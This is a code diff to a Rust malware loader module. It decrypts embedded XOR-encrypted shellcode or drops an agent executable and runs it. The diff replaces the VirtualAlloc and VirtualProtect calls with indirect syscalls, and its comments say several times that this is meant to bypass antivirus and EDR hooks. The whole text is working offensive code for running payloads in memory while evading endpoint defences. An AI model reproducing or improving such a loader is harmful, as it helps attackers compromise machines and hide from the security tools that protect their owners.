@@ -5,6 +5,9 @@
 //! 2. AGENT mode: Drop and execute XOR-encrypted agent.exe (simpler, recommended)
 //!
 //! The mode is determined by the EXECUTION_MODE constant in config.rs
+//!
+//! IMPORTANT: This module uses INDIRECT SYSCALLS via dinvk for memory allocation
+//! to bypass AV/EDR hooks on VirtualAlloc/VirtualProtect.
 
 use crate::config::{ENCRYPTED_AGENT, ENCRYPTED_SHELLCODE, EXECUTION_MODE};
 
@@ -18,7 +21,7 @@ pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
         // Agent mode: drop and execute
         execute_agent_mode(xor_key)
     } else if !ENCRYPTED_SHELLCODE.is_empty() {
-        // Shellcode mode: in-memory execution
+        // Shellcode mode: in-memory execution with indirect syscalls
         execute_shellcode_mode(xor_key)
     } else {
         Err("No payload embedded".into())
@@ -57,30 +60,23 @@ fn execute_agent_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> 
     Ok(())
 }
 
-/// Execute shellcode in memory (legacy mode, requires donut)
+/// Execute shellcode in memory using INDIRECT SYSCALLS
+/// This bypasses AV/EDR hooks on VirtualAlloc/VirtualProtect
 #[cfg(target_os = "windows")]
 fn execute_shellcode_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
+    use crate::syscalls;
     use std::ptr;
-    use winapi::shared::minwindef::DWORD;
-    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
 
     // Decrypt shellcode in memory
     let shellcode = xor_decrypt(ENCRYPTED_SHELLCODE, xor_key);
-
-    // Allocate memory with RW permissions
     let shellcode_len = shellcode.len();
-    let mem = unsafe {
-        VirtualAlloc(
-            ptr::null_mut(),
-            shellcode_len,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        )
-    };
+
+    // Allocate memory with RW permissions using INDIRECT SYSCALL
+    // This bypasses hooks on VirtualAlloc
+    let mem = syscalls::allocate_rw_memory(shellcode_len);
 
     if mem.is_null() {
-        return Err("VirtualAlloc failed".into());
+        return Err("NtAllocateVirtualMemory failed (indirect syscall)".into());
     }
 
     // Copy shellcode to allocated memory
@@ -88,12 +84,10 @@ fn execute_shellcode_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Erro
         ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode_len);
     }
 
-    // Change memory protection to RX (Read + Execute)
-    let mut old_protect: DWORD = 0;
-    let result = unsafe { VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &mut old_protect) };
-
-    if result == 0 {
-        return Err("VirtualProtect failed".into());
+    // Change memory protection to RX using INDIRECT SYSCALL
+    // This bypasses hooks on VirtualProtect
+    if !syscalls::make_memory_executable(mem, shellcode_len) {
+        return Err("NtProtectVirtualMemory failed (indirect syscall)".into());
     }
 
     // Execute shellcode
